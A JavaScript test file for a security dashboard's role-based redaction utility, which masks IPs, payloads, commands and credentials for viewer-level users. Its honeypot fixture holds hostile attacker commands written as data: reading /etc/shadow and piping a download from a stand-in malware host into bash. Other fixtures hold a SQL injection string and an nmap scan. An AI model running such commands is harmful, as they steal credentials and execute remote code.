'use strict'

const {
  redactIP,
  redactTextWithIPs,
  redactThreat,
  redactHoneypotSession,
  redactCampaign,
  redactAIPrediction,
  redactAlert,
  redactSystemHealth,
} = require('../utils/redact')

describe('Unified Redaction Utility (backend/utils/redact.js)', () => {
  describe('IP Redaction (IPv4 & IPv6)', () => {
    it('masks the last octet of an IPv4 address', () => {
      expect(redactIP('192.168.1.105')).toBe('192.168.1.xxx')
      expect(redactIP('10.0.0.1')).toBe('10.0.0.xxx')
      expect(redactIP('172.16.254.1')).toBe('172.16.254.xxx')
    })

    it('masks the last segment of an IPv6 address', () => {
      expect(redactIP('2001:0db8:85a3:0000:0000:8a2e:0370:7334')).toBe('2001:0db8:85a3:0000:0000:8a2e:0370:xxxx')
      expect(redactIP('2001:db8::1')).toBe('2001:db8::xxxx')
    })

    it('returns empty or non-string inputs safely', () => {
      expect(redactIP('')).toBe('')
      expect(redactIP(null)).toBe(null)
      expect(redactIP(undefined)).toBe(undefined)
    })

    it('masks IPs embedded in descriptive text', () => {
      const text = 'Brute force alert triggered from 192.168.1.50 targeting SSH service'
      expect(redactTextWithIPs(text)).toBe('Brute force alert triggered from 192.168.1.xxx targeting SSH service')
    })
  })

  describe('Threat Redaction', () => {
    const rawThreat = {
      _id: '64a1b2c3d4e5f6a7b8c9d0e1',
      sourceIP: '192.168.1.200',
      attackType: 'SQL_INJECTION',
      severity: 'HIGH',
      aiScore: 0.88,
      status: 'DETECTED',
      payload: 'SELECT * FROM users WHERE admin=1; --',
      payloadHash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
      rawPacket: '4500003c1a2b40004006..',
      createdAt: new Date().toISOString(),
    }

    it('redacts sensitive fields for Viewer role', () => {
      const result = redactThreat(rawThreat, 'viewer')
      expect(result.sourceIP).toBe('192.168.1.xxx')
      expect(result.payload).toBe('[REDACTED_PAYLOAD]')
      expect(result.payloadHash).toBe('[REDACTED_HASH]')
      expect(result.rawPacket).toBe('[REDACTED_PACKET]')
      expect(result.attackType).toBe('SQL_INJECTION')
      expect(result.severity).toBe('HIGH')
    })

    it('preserves exact shape and unredacted values for Admin and Analyst', () => {
      const adminResult = redactThreat(rawThreat, 'admin')
      expect(adminResult).toEqual(rawThreat)
      expect(adminResult.sourceIP).toBe('192.168.1.200')
      expect(adminResult.payload).toBe('SELECT * FROM users WHERE admin=1; --')

      const analystResult = redactThreat(rawThreat, 'analyst')
      expect(analystResult).toEqual(rawThreat)
      expect(analystResult.sourceIP).toBe('192.168.1.200')
    })
  })

  describe('Honeypot Session Redaction', () => {
    const rawSession = {
      _id: 'session-12345',
      sourceIP: '10.0.0.88',
      honeypotNode: 'cowrie-ssh-01',
      commands: [
        { command: 'cat /etc/shadow', input: 'cat /etc/shadow', timestamp: new Date().toISOString() },
        { command: 'curl http://malware.site/payload.sh | bash', timestamp: new Date().toISOString() },
      ],
      credentials: { username: 'root', password: 'SuperSecretPassword123' },
    }

    it('redacts commands, credentials, and sourceIP for Viewer', () => {
      const result = redactHoneypotSession(rawSession, 'viewer')
      expect(result.sourceIP).toBe('10.0.0.xxx')
      expect(result.commands[0].command).toBe('[REDACTED_COMMAND]')
      expect(result.commands[0].input).toBe('[REDACTED_COMMAND]')
      expect(result.commands[1].command).toBe('[REDACTED_COMMAND]')
      expect(result.credentials.password).toBe('[REDACTED_CREDENTIAL]')
    })

    it('preserves full session telemetry for Analyst and Admin', () => {
      expect(redactHoneypotSession(rawSession, 'analyst')).toEqual(rawSession)
      expect(redactHoneypotSession(rawSession, 'admin')).toEqual(rawSession)
    })
  })

  describe('Campaign Redaction', () => {
    const rawCampaign = {
      _id: 'campaign-001',
      name: 'Coordinated Recon',
      attackerIP: '172.16.0.42',
      relatedIPs: ['172.16.0.43', '172.16.0.44'],
      memberSessions: [
        {
          sourceIP: '172.16.0.42',
          commands: [{ command: 'nmap -sS target' }],
        },
      ],
    }

    it('redacts attacker IPs and member session commands for Viewer', () => {
      const result = redactCampaign(rawCampaign, 'viewer')
      expect(result.attackerIP).toBe('172.16.0.xxx')
      expect(result.relatedIPs).toEqual(['172.16.0.xxx', '172.16.0.xxx'])
      expect(result.memberSessions[0].sourceIP).toBe('172.16.0.xxx')
      expect(result.memberSessions[0].commands[0].command).toBe('[REDACTED_COMMAND]')
    })

    it('leaves campaign unredacted for Admin and Analyst', () => {
      expect(redactCampaign(rawCampaign, 'admin')).toEqual(rawCampaign)
      expect(redactCampaign(rawCampaign, 'analyst')).toEqual(rawCampaign)
    })
  })

  describe('AI Prediction Redaction', () => {
    const rawPrediction = {
      _id: 'pred-999',
      sourceIP: '198.51.100.22',
      predictedClass: 'DDoS',
      threatScore: 0.95,
      payload: 'SYN flood stream packet data',
    }

    it('masks source IP and payload for Viewer', () => {
      const result = redactAIPrediction(rawPrediction, 'viewer')
      expect(result.sourceIP).toBe('198.51.100.xxx')
      expect(result.payload).toBe('[REDACTED_PAYLOAD]')
      expect(result.predictedClass).toBe('DDoS')
    })

    it('preserves prediction for Admin and Analyst', () => {
      expect(redactAIPrediction(rawPrediction, 'admin')).toEqual(rawPrediction)
      expect(redactAIPrediction(rawPrediction, 'analyst')).toEqual(rawPrediction)
    })
  })

  describe('Alert Redaction', () => {
    const rawAlert = {
      _id: 'alert-1',
      title: 'IP 192.168.1.105 Blocked',
      message: 'Suspicious brute force attack from 192.168.1.105 on port 22',
      severity: 'HIGH',
    }

    it('masks IPs inside alert message and title for Viewer', () => {
      const result = redactAlert(rawAlert, 'viewer')
      expect(result.title).toBe('IP 192.168.1.xxx Blocked')
      expect(result.message).toBe('Suspicious brute force attack from 192.168.1.xxx on port 22')
    })

    it('preserves alert for Admin and Analyst', () => {
      expect(redactAlert(rawAlert, 'admin')).toEqual(rawAlert)
      expect(redactAlert(rawAlert, 'analyst')).toEqual(rawAlert)
    })
  })
})
